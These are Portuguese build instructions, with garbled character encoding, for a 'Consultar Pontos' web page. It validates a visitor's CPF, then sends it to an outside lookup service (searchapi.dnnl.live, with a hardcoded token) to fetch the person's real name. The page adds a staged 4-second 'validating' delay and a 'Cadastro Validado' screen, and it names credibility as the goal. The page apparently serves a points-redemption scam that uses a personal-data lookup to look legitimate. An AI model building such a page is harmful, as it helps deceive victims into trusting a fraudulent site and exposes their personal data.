Implemente validaÃ§Ã£o oficial de CPF no front-end, impedindo consultas com nÃºmeros invÃ¡lidos e liberando apenas CPFs vÃ¡lidos para a API.

ğŸ¯ OBJETIVO

Quando o usuÃ¡rio digitar o CPF:

âœ”ï¸ Validar pelo algoritmo oficial
âœ”ï¸ Se invÃ¡lido â†’ mostrar erro
âœ”ï¸ Se vÃ¡lido â†’ consultar API
âœ”ï¸ Mostrar nome na tela final

ğŸ§© 1ï¸âƒ£ AJUSTAR INPUT (HTML)

Garanta:

<input id="cpfInput" type="text" placeholder="000.000.000-00">
<button id="btnConsultar">Consultar Pontos</button>

<p id="cpfErro" class="erro-cpf"></p>

ğŸ¨ 2ï¸âƒ£ ESTILO DO ERRO (CSS)

Adicionar:

.erro-cpf {
  color: #e53935;
  font-size: 13px;
  margin-top: 6px;
  text-align: center;
}

âš™ï¸ 3ï¸âƒ£ FUNÃ‡ÃƒO OFICIAL DE VALIDAÃ‡ÃƒO CPF (JS)

No script.js, adicione:

function validarCPF(cpf) {

  cpf = cpf.replace(/\D/g, "");

  if (cpf.length !== 11) return false;

  // Bloqueia CPFs repetidos
  if (/^(\d)\1+$/.test(cpf)) return false;

  let soma = 0;
  let resto;

  // Primeiro dÃ­gito
  for (let i = 1; i <= 9; i++) {
    soma += parseInt(cpf.substring(i - 1, i)) * (11 - i);
  }

  resto = (soma * 10) % 11;

  if (resto === 10 || resto === 11) resto = 0;
  if (resto !== parseInt(cpf.substring(9, 10))) return false;

  soma = 0;

  // Segundo dÃ­gito
  for (let i = 1; i <= 10; i++) {
    soma += parseInt(cpf.substring(i - 1, i)) * (12 - i);
  }

  resto = (soma * 10) % 11;

  if (resto === 10 || resto === 11) resto = 0;
  if (resto !== parseInt(cpf.substring(10, 11))) return false;

  return true;
}

ğŸ§© 4ï¸âƒ£ BLOQUEAR CONSULTA SE CPF FOR INVÃLIDO

Substitua sua funÃ§Ã£o de consulta por:

document.getElementById("btnConsultar").addEventListener("click", consultarCPF);

function consultarCPF() {

  let cpf = document.getElementById("cpfInput").value;
  const erro = document.getElementById("cpfErro");

  cpf = cpf.replace(/\D/g, "");

  erro.innerText = "";

  // ValidaÃ§Ã£o oficial
  if (!validarCPF(cpf)) {

    erro.innerText = "CPF invÃ¡lido. Verifique e tente novamente.";

    return;
  }

  mostrarLoadingApp(
    "Consultando dados...",
    "Validando CPF no sistema...",
    4000
  );

  const url = `https://searchapi.dnnl.live/consulta?token_api=3531&cpf=${cpf}`;

  fetch(url)
    .then(res => res.json())
    .then(data => {

      esconderLoadingApp();

      let nome = "";

      if (data.nome) nome = data.nome;
      else if (data.name) nome = data.name;
      else if (data.NOME) nome = data.NOME;

      if (!nome) {
        nome = "Cadastro validado";
      }

      // Salva dados
      localStorage.setItem("nomeUsuario", nome);
      localStorage.setItem("cpfUsuario", cpf);

      mostrarResultado(nome, cpf);

    })
    .catch(() => {

      esconderLoadingApp();

      erro.innerText = "Erro ao consultar CPF. Tente novamente.";

    });
}

ğŸ§© 5ï¸âƒ£ MOSTRAR NOME NA TELA FINAL

No JS da tela de resultado:

window.addEventListener("load", function() {

  const nome = localStorage.getItem("nomeUsuario");
  const cpf = localStorage.getItem("cpfUsuario");

  if (nome) {
    document.getElementById("nomeFinal").innerText = nome;
  }

  if (cpf) {
    document.getElementById("cpfFinal").innerText = cpf;
  }

});

ğŸ§© 6ï¸âƒ£ CONFIRMAR HTML FINAL

Na tela â€œCadastro Validadoâ€, tenha:

<h3 id="nomeFinal"></h3>
<p>CPF: <span id="cpfFinal"></span></p>

âœ… RESULTADO FINAL

Depois disso:

âœ”ï¸ CPF falso nÃ£o passa
âœ”ï¸ CPF repetido bloqueado
âœ”ï¸ CPF invÃ¡lido barrado
âœ”ï¸ SÃ³ CPF real consulta API
âœ”ï¸ Nome aparece automÃ¡tico
âœ”ï¸ Mais credibilidade